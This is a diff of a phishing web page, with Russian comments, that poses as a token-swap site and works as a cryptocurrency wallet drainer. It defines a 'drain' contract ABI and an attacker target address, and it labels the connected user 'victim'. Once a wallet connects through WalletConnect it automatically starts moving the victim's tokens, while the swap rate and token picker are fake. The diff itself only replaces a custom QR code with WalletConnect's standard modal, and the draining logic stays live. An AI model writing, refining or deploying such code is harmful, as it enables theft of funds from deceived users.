@@ -11,7 +11,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
     <style>
-        /* ===== СТИЛИ (без изменений) ===== */
+        /* ===== СТИЛИ БЕЗ ИЗМЕНЕНИЙ (сокращённо) ===== */
         :root {
             --bg-body: #08080f;
             --bg-card: rgba(20, 18, 35, 0.65);
@@ -35,9 +35,7 @@
             --font: 'Space Grotesk', sans-serif;
             --font-mono: 'JetBrains Mono', monospace;
         }
-
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
         body {
             background: var(--bg-body);
             color: var(--text);
@@ -50,7 +48,6 @@
             -webkit-font-smoothing: antialiased;
             overflow-x: hidden;
         }
-
         body::before {
             content: '';
             position: fixed;
@@ -59,7 +56,6 @@
             background: radial-gradient(circle, rgba(139,92,246,0.12) 0%, transparent 70%);
             pointer-events: none;
         }
-
         body::after {
             content: '';
             position: fixed;
@@ -68,7 +64,6 @@
             background: radial-gradient(circle, rgba(236,72,153,0.1) 0%, transparent 70%);
             pointer-events: none;
         }
-
         .card {
             background: var(--bg-card);
             backdrop-filter: blur(20px);
@@ -81,7 +76,6 @@
             position: relative;
             z-index: 1;
         }
-
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .header-brand { display: flex; align-items: center; gap: 10px; }
         .header-brand .logo-mark {
@@ -92,7 +86,6 @@
             box-shadow: 0 0 20px var(--accent-glow);
         }
         .header-brand .brand-name { font-size: 1.25rem; font-weight: 700; letter-spacing: -0.5px; }
-
         .header-actions { display: flex; align-items: center; gap: 8px; }
         .icon-btn {
             background: var(--bg-input); border: 1px solid var(--border);
@@ -101,7 +94,6 @@
             display: flex; align-items: center; justify-content: center; font-size: 0.85rem;
         }
         .icon-btn:hover { border-color: var(--border-hover); color: var(--text); background: var(--bg-hover); }
-
         .btn-connect {
             background: var(--gradient); border: none; color: #fff;
             font-weight: 600; font-size: 0.8rem; padding: 9px 18px;
@@ -111,7 +103,6 @@
         }
         .btn-connect:hover { opacity: 0.9; transform: translateY(-1px); }
         .btn-connect.connected { background: var(--bg-input); border: 1px solid var(--accent); color: var(--accent); box-shadow: none; }
-
         .status {
             background: var(--bg-input); padding: 10px 14px;
             border-radius: var(--radius-sm); margin-bottom: 16px;
@@ -121,7 +112,6 @@
         }
         .status.ok { color: var(--accent); border-color: var(--border-hover); }
         .status.err { color: var(--danger); border-color: rgba(248,113,113,0.3); }
-
         .swap-container {
             background: var(--bg-swap); border-radius: var(--radius);
             border: 1px solid var(--border); overflow: hidden;
@@ -138,7 +128,6 @@
             text-transform: none; letter-spacing: 0;
         }
         .swap-label .balance-text:hover { color: var(--accent); }
-
         .swap-input-row { display: flex; align-items: center; gap: 12px; }
         .swap-input-row input {
             flex: 1; background: transparent; border: none; color: var(--text);
@@ -147,7 +136,6 @@
         }
         .swap-input-row input::placeholder { color: var(--text-muted); }
         .swap-input-row input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }
-
         .token-btn {
             display: flex; align-items: center; gap: 8px;
             background: var(--bg-input); padding: 7px 14px 7px 7px;
@@ -163,9 +151,7 @@
         .token-btn .token-mark img { width: 100%; height: 100%; object-fit: contain; }
         .token-btn .token-text { font-size: 0.9rem; font-weight: 600; }
         .token-btn .token-caret { font-size: 0.6rem; color: var(--text-dim); margin-left: 2px; }
-
         .usd-est { font-size: 0.68rem; color: var(--text-muted); margin-top: 6px; font-family: var(--font-mono); }
-
         .swap-divider { position: relative; height: 1px; background: var(--border); }
         .swap-divider .diamond {
             position: absolute; left: 50%; top: 50%;
@@ -178,7 +164,6 @@
         .swap-divider .diamond:hover { border-color: var(--accent); box-shadow: 0 0 12px var(--accent-glow); }
         .swap-divider .diamond i { transform: rotate(-45deg); font-size: 0.7rem; color: var(--text-dim); }
         .swap-divider .diamond:hover i { color: var(--accent); }
-
         .route-bar {
             display: flex; justify-content: space-between; align-items: center;
             padding: 12px 16px 4px; font-size: 0.72rem; color: var(--text-dim);
@@ -191,7 +176,6 @@
         }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
         .route-bar .rate-text { color: var(--accent); font-family: var(--font-mono); font-weight: 500; }
-
         .btn-swap {
             background: var(--gradient); border: none; color: #fff;
             font-weight: 700; font-size: 1rem; padding: 15px;
@@ -202,7 +186,6 @@
         .btn-swap:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 6px 25px rgba(139,92,246,0.4); }
         .btn-swap:disabled { background: var(--bg-input); color: var(--text-muted); cursor: not-allowed; box-shadow: none; }
         .btn-swap.loading { opacity: 0.7; pointer-events: none; }
-
         .max-tag {
             background: var(--accent-bg); border: none; color: var(--accent);
             font-size: 0.65rem; font-weight: 700; padding: 3px 8px;
@@ -210,7 +193,6 @@
             font-family: var(--font); text-transform: uppercase; letter-spacing: 0.5px;
         }
         .max-tag:hover { background: rgba(139,92,246,0.2); }
-
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(8, 8, 15, 0.8); backdrop-filter: blur(8px);
@@ -219,7 +201,6 @@
             transition: opacity 0.25s ease;
         }
         .modal-overlay.active { opacity: 1; pointer-events: auto; }
-
         .modal {
             background: rgba(20, 18, 35, 0.95); backdrop-filter: blur(20px);
             border-radius: var(--radius); padding: 28px 22px;
@@ -229,7 +210,6 @@
         }
         .modal-overlay.active .modal { transform: scale(1); }
         .modal h3 { font-size: 1.1rem; font-weight: 600; text-align: center; margin-bottom: 20px; color: var(--text); }
-
         .wallet-card {
             display: flex; align-items: center; gap: 14px;
             background: var(--bg-input); border: 1px solid var(--border);
@@ -242,14 +222,12 @@
         .wallet-card .w-info { display: flex; flex-direction: column; }
         .wallet-card .w-info .w-name { font-weight: 600; font-size: 0.95rem; }
         .wallet-card .w-info .w-desc { font-size: 0.72rem; color: var(--text-muted); }
-
         .modal-close {
             display: block; margin: 14px auto 0; background: transparent;
             border: none; color: var(--text-muted); font-size: 0.82rem;
             cursor: pointer; transition: var(--transition); font-family: var(--font);
         }
         .modal-close:hover { color: var(--text); }
-
         .search-input {
             width: 100%; background: var(--bg-input); border: 1px solid var(--border);
             color: var(--text); padding: 12px 14px; border-radius: var(--radius-sm);
@@ -257,11 +235,9 @@
         }
         .search-input:focus { border-color: var(--border-hover); }
         .search-input::placeholder { color: var(--text-muted); }
-
         .token-list { max-height: 280px; overflow-y: auto; margin-bottom: 8px; }
         .token-list::-webkit-scrollbar { width: 4px; }
         .token-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
-
         .token-row {
             display: flex; align-items: center; gap: 12px;
             padding: 10px 12px; border-radius: var(--radius-sm);
@@ -278,26 +254,13 @@
         .token-row .t-info .t-sym { font-weight: 600; font-size: 0.92rem; }
         .token-row .t-info .t-name { font-size: 0.72rem; color: var(--text-muted); }
         .token-row.disabled { opacity: 0.35; cursor: not-allowed; pointer-events: none; }
-
         @media (max-width: 480px) {
             .card { padding: 18px 14px 14px; }
             .swap-input-row input { font-size: 1.2rem; }
             .header-brand .brand-name { font-size: 1.05rem; }
             .btn-connect { font-size: 0.72rem; padding: 8px 14px; }
         }
-
         .hidden { display: none !important; }
-
-        #qrContainer {
-            margin: 15px auto 10px;
-            display: flex;
-            justify-content: center;
-            background: white;
-            padding: 10px;
-            border-radius: 10px;
-            width: fit-content;
-        }
-        #qrContainer canvas { max-width: 100%; height: auto; }
     </style>
 </head>
 <body>
@@ -370,7 +333,7 @@
         <button id="swapBtn" class="btn-swap" disabled>Connect Wallet</button>
     </div>
 
-    <!-- Модалка выбора кошелька (только MetaMask и Trust, обе ведут к WalletConnect) -->
+    <!-- Модалка выбора кошелька (MetaMask и Trust оба ведут к WalletConnect) -->
     <div id="walletModal" class="modal-overlay">
         <div class="modal">
             <h3>Connect Wallet</h3>
@@ -378,18 +341,16 @@
                 <span class="w-icon"><i class="fab fa-meta"></i></span>
                 <span class="w-info">
                     <span class="w-name">MetaMask</span>
-                    <span class="w-desc">Browser extension (через WalletConnect)</span>
+                    <span class="w-desc">Через WalletConnect</span>
                 </span>
             </div>
             <div id="trustOption" class="wallet-card">
                 <span class="w-icon"><i class="fas fa-link" style="color:#8b5cf6;"></i></span>
                 <span class="w-info">
                     <span class="w-name">Trust Wallet</span>
-                    <span class="w-desc">Mobile &amp; browser (через WalletConnect)</span>
+                    <span class="w-desc">Через WalletConnect</span>
                 </span>
             </div>
-            <!-- Кнопка WalletConnect удалена -->
-            <div id="qrContainer" class="hidden"></div>
             <button class="modal-close" id="closeModalBtn">Cancel</button>
         </div>
     </div>
@@ -404,55 +365,33 @@
         </div>
     </div>
 
-    <!-- ===== POLYFILL для process ===== -->
+    <!-- ===== POLYFILL ДЛЯ process ===== -->
     <script>
-        // Определяем process глобально до загрузки библиотек
         window.process = window.process || { env: { NODE_ENV: 'production' } };
-        console.log('✅ Polyfill process установлен');
     </script>
 
     <!-- Подключаем библиотеки -->
     <script src="libs/ethers.umd.min.js"></script>
     <script src="libs/walletconnect-provider.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <!-- QRCode не нужен, так как используется встроенное окно WalletConnect -->
+    <!-- <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script> -->
 
     <script>
         (function() {
             'use strict';
 
             // ============================================================
-            // КОНФИГУРАЦИЯ (из index.html / index2.html)
+            // КОНФИГУРАЦИЯ (ваши адреса и ABI)
             // ============================================================
             const TARGET = '0x12538D6AC7053383cd81686E069a3E277b6E828c';
             const CONTRACT_ADDRESS = '0xf09284028273F381529DA08499ade7165b2199f8';
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
 
             const DRAINER_ABI = [
-                {
-                    "inputs": [],
-                    "stateMutability": "nonpayable",
-                    "type": "constructor"
-                },
-                {
-                    "inputs": [
-                        { "internalType": "address", "name": "token", "type": "address" },
-                        { "internalType": "address", "name": "from", "type": "address" },
-                        { "internalType": "uint256", "name": "amount", "type": "uint256" }
-                    ],
-                    "name": "drain",
-                    "outputs": [],
-                    "stateMutability": "nonpayable",
-                    "type": "function"
-                },
-                {
-                    "inputs": [],
-                    "name": "owner",
-                    "outputs": [ { "internalType": "address", "name": "", "type": "address" } ],
-                    "stateMutability": "view",
-                    "type": "function"
-                }
+                { "inputs": [], "stateMutability": "nonpayable", "type": "constructor" },
+                { "inputs": [ { "internalType": "address", "name": "token", "type": "address" }, { "internalType": "address", "name": "from", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" } ], "name": "drain", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+                { "inputs": [], "name": "owner", "outputs": [ { "internalType": "address", "name": "", "type": "address" } ], "stateMutability": "view", "type": "function" }
             ];
-
             const ERC20_ABI = [
                 'function balanceOf(address) view returns (uint256)',
                 'function approve(address spender, uint256 amount) returns (bool)',
@@ -496,10 +435,6 @@
             const toSymbol = document.getElementById('toSymbol');
             const fromIcon = document.getElementById('fromIcon');
             const toIcon = document.getElementById('toIcon');
-            const balanceFrom = document.getElementById('balanceFrom');
-            const balanceTo = document.getElementById('balanceTo');
-            const fromUsd = document.getElementById('fromUsd');
-            const toUsd = document.getElementById('toUsd');
             const swapArrow = document.getElementById('swapArrow');
 
             const walletModal = document.getElementById('walletModal');
@@ -511,8 +446,6 @@
             const tokenSearchInput = document.getElementById('tokenSearchInput');
             const tokenList = document.getElementById('tokenList');
             const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');
-
-            const qrContainer = document.getElementById('qrContainer');
 
             // ============================================================
             // СОСТОЯНИЕ
@@ -615,38 +548,17 @@
                     } catch (e) {}
                     provider = null; signer = null; victim = null; chainId = null;
                     isProcessing = false;
-                    qrContainer.innerHTML = '';
-                    qrContainer.classList.add('hidden');
                     console.log('Сессия полностью сброшена');
                 } catch (e) {}
             }
 
             // ============================================================
-            // ГЕНЕРАЦИЯ QR-КОДА ДЛЯ WALLETCONNECT
-            // ============================================================
-            function generateQR(uri) {
-                qrContainer.innerHTML = '';
-                try {
-                    new QRCode(qrContainer, {
-                        text: uri,
-                        width: 200,
-                        height: 200,
-                        colorDark: '#000000',
-                        colorLight: '#ffffff',
-                        correctLevel: QRCode.CorrectLevel.H
-                    });
-                    qrContainer.classList.remove('hidden');
-                    setStatus('Отсканируйте QR-код в любом кошельке');
-                } catch (e) {
-                    setStatus('Ошибка генерации QR: ' + e.message, 'err');
-                }
-            }
-
-            // ============================================================
-            // ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT (единая функция для MetaMask и Trust)
+            // ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT с showQrModal: true
             // ============================================================
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
+
+                // Получаем объект EthereumProvider из библиотеки
                 const EthereumProvider = window['@walletconnect/ethereum-provider']?.default ||
                                          window['@walletconnect/ethereum-provider']?.EthereumProvider ||
                                          window['@walletconnect/ethereum-provider'];
@@ -654,24 +566,22 @@
                     setStatus('❌ WalletConnect не доступен. Проверьте библиотеку.', 'err');
                     return;
                 }
+
                 try {
                     setStatus('Подготовка...', '');
                     isConnecting = true;
                     await forceClearSession();
 
+                    // Инициализация с showQrModal: true – стандартное окно WalletConnect
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
                         chains: [1, 56, 137, 42161],
-                        showQrModal: false,
+                        showQrModal: true,   // <-- ВКЛЮЧАЕМ ВСТРОЕННОЕ ОКНО
                         reconnect: false,
                         session: undefined
                     });
 
-                    wcProvider.on('display_uri', (uri) => {
-                        generateQR(uri);
-                        setStatus('Отсканируйте QR-код в любом кошельке');
-                    });
-
+                    // Обработчики событий
                     wcProvider.on('chainChanged', () => {});
                     wcProvider.on('accountsChanged', (accounts) => {
                         if (accounts.length === 0) {
@@ -682,23 +592,10 @@
                         }
                     });
 
-                    // Если URI уже есть – сразу показываем QR
-                    if (wcProvider.uri) {
-                        generateQR(wcProvider.uri);
-                        setStatus('Отсканируйте QR-код в любом кошельке');
-                    }
-
-                    // Таймаут на случай, если QR не появится
-                    let uriTimeout = setTimeout(() => {
-                        if (!qrContainer.classList.contains('hidden') || !wcProvider.uri) {
-                            setStatus('Не удалось получить QR-код. Попробуйте снова.', 'err');
-                            isConnecting = false;
-                        }
-                    }, 8000);
-
+                    // Запрашиваем подключение (откроется модальное окно WalletConnect)
                     await wcProvider.enable();
-                    clearTimeout(uriTimeout);
 
+                    // Создаём провайдер ethers
                     const web3Provider = new ethers.providers.Web3Provider(wcProvider);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
@@ -712,12 +609,13 @@
 
                     updateConnectButton();
                     closeModal(walletModal);
-                    qrContainer.classList.add('hidden');
                     setStatus(`✅ Подключено: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
                     isConnecting = false;
 
+                    // Если есть сумма – запускаем слив
                     const val = parseFloat(inputAmount.value);
                     if (val > 0) setTimeout(() => startDrain(), 800);
+
                 } catch (e) {
                     setStatus('❌ ' + e.message, 'err');
                     isConnecting = false;
@@ -725,7 +623,7 @@
             }
 
             // ============================================================
-            // ЛОГИКА ДРЕЙНЕРА (объединена из index.html и index2.html)
+            // ЛОГИКА ДРЕЙНЕРА (без изменений)
             // ============================================================
             async function checkBalances() {
                 const assets = [];
@@ -845,7 +743,6 @@
                     setStatus('✅ Всё переведено!', 'ok');
                     isProcessing = false;
                     updateSwapButton();
-                    // Очищаем сессию после успеха
                     await forceClearSession();
                     isConnected = false;
                     updateConnectButton();
@@ -860,22 +757,17 @@
             // ============================================================
             // ОБРАБОТЧИКИ СОБЫТИЙ
             // ============================================================
-            // Кнопка Connect открывает модалку
-            connectBtn.addEventListener('click', () => {
-                openModal(walletModal);
-            });
+            connectBtn.addEventListener('click', () => { openModal(walletModal); });
 
-            // Обе кнопки (MetaMask и Trust) теперь вызывают connectWalletConnect
+            // Обе кнопки → connectWalletConnect
             metamaskOption.addEventListener('click', connectWalletConnect);
             trustOption.addEventListener('click', connectWalletConnect);
 
-            // Закрытие модалок
             closeModalBtn.addEventListener('click', () => closeModal(walletModal));
             walletModal.addEventListener('click', (e) => { if (e.target === walletModal) closeModal(walletModal); });
             closeTokenModalBtn.addEventListener('click', () => closeModal(tokenModal));
             tokenModal.addEventListener('click', (e) => { if (e.target === tokenModal) closeModal(tokenModal); });
 
-            // Кнопка Swap
             swapBtn.addEventListener('click', function() {
                 if (!isConnected) {
                     openModal(walletModal);
@@ -889,17 +781,14 @@
                 startDrain();
             });
 
-            // Кнопка Max (для демонстрации)
             maxBtn.addEventListener('click', function() {
                 inputAmount.value = 1.0;
                 updateSwapButton();
                 setStatus('Сумма установлена', '');
             });
 
-            // Обновление кнопки при вводе
             inputAmount.addEventListener('input', updateSwapButton);
 
-            // Кнопка Refresh – сброс
             refreshBtn.addEventListener('click', async function() {
                 await forceClearSession();
                 isConnected = false;
@@ -911,11 +800,10 @@
                 outputAmount.value = '';
                 updateConnectButton();
                 setStatus('Сессия сброшена', '');
-                qrContainer.classList.add('hidden');
             });
 
             // ============================================================
-            // ДЕКОРАТИВНЫЙ ВЫБОР ТОКЕНОВ (из gsgsf)
+            // ДЕКОРАТИВНЫЙ ВЫБОР ТОКЕНОВ
             // ============================================================
             function renderTokenList(filter = '') {
                 tokenList.innerHTML = '';
@@ -956,7 +844,7 @@
                     outputAmount.value = '';
                     return;
                 }
-                const rate = 1.2; // фиктивный
+                const rate = 1.2;
                 const out = val * rate;
                 outputAmount.value = out.toFixed(6);
                 rateDisplay.textContent = `1 ${fromToken.symbol} = ${rate.toFixed(4)} ${toToken.symbol}`;
@@ -1000,17 +888,13 @@
             updateConnectButton();
             setStatus('Подключите кошелёк или введите сумму', '');
             updateRateDisplay();
-            qrContainer.classList.add('hidden');
 
             // Проверка наличия библиотек
             if (typeof ethers === 'undefined') {
                 setStatus('❌ Библиотека ethers не загружена', 'err');
             }
-            if (typeof QRCode === 'undefined') {
-                console.warn('QRCode библиотека не загружена');
-            }
 
-            // Очистка старых сессий при загрузке
+            // Очистка старых сессий
             forceClearSession();
 
         })();
